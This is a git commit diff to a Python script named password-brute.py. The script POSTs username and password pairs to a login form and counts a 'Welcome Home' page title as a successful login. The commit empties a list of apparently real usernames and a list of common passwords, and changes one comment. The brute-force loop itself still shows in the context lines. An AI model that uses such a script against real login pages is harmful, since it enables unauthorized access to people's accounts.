e66b10dc64c60136e0f8fe642f45975ba7bf59b6
EmilSu <91603202+EmilSuuronen@users.noreply.github.com>
2024-04-03 11:29:24 +0300

    Update password-brute.py

--- password-brute.py
+++ password-brute.py
@@ -14,35 +14,11 @@ headers = {
 
 # Example lists of usernames and passwords
 usernames = [
-    "Elchen_2", "el_chocle", "ElChuckyneitor", "ElCidCrafteador", "elconin",
-    "ElConquistador", "elcoolion", "ElCorko", "elcrafteur", "El_Crafto",
-    "ElCrisco", "ElCristo8", "elCZstrickey", "eld", "elda",
-    "eldaelden", "elDanXD", "elda_oromis", "eldar", "eldenelder",
-    "eldenker", "elder", "Elder", "Elder1", "ElderAidsMage",
-    "Elderand", "entitle", "entity", "entity0x", "entity_303",
-    "Entity303", "EntityBean", "ento", "ENTO22", "entoan",
-    "entoblast", "entoderm", "entoil", "entomb", "entomo",
-    "entomologize", "entomology", "entomophagous", "entomophilous", "entomostracan",
-    "EnToony", "entophyte", "entopic", "entourage", "entozoic",
-    "entozoon", "entr", "entrails", "entrain", "entrammel",
-    "entrance", "EntrancedCape5", "entranceway", "entrant", "entrap",
-    "entreat", "entreaty", "entrechat", "entree", "gastrin",
-    "gastritis", "gastro", "gastrocnemius", "gastroenteritis", "gastroenterology",
-    "gastroenterostomy", "gastrointestinal", "gastrolith", "gastrolizard", "gastrology",
-    "Gastronam", "gastronome", "gastronomy", "gastropod", "gastroscope",
-    "gastrostomy", "gastrotomy", "gastrotrich", "gastrovascular", "gastrula",
-    "gastrulation", "gasts", "gasttest", "gastuser", "Gasuros",
-    "gasworks", "Gasyboy", "Gasymexican", "gat", "Gatanater",
-    "Gatchi"
+
 ]
 
 passwords = [
-    "amanda", "bear", "frank", "brazil", "baseball", "wizard", "tiger", "hannah",
-    "lauren", "master", "xxxxxxxx", "doctor", "dave", "japan", "michael", "money",
-    "gateway", "eagle1", "naked", "football", "phoenix", "gators", "11111", "squirt",
-    "shadow", "mickey", "angel", "mother", "stars", "monkey", "bailey", "junior",
-    "nathan", "apple", "abc123", "knight", "thx1138", "raiders", "alexis", "pass",
-    "iceman", "porno", "steve", "aaaa", "fuckme", "tigers", "badboy", "forever", "bonnie"
+
 ]
 
 successful_logins = []
@@ -57,7 +33,7 @@ for username in usernames:
         # Send the POST request with the form data
         response = session.post(url, data, headers)
         
-        # Checking for a specific pattern in the response to indicate successful login
+        # Checking for a specific pattern in the response to indicate successful login. Change to expected result
         if "<title>Welcome Home" in response.text:
             print(f"Success with username: {username} and password: {password}")
             # Optionally, break out of the loop or perform additional actions upon success
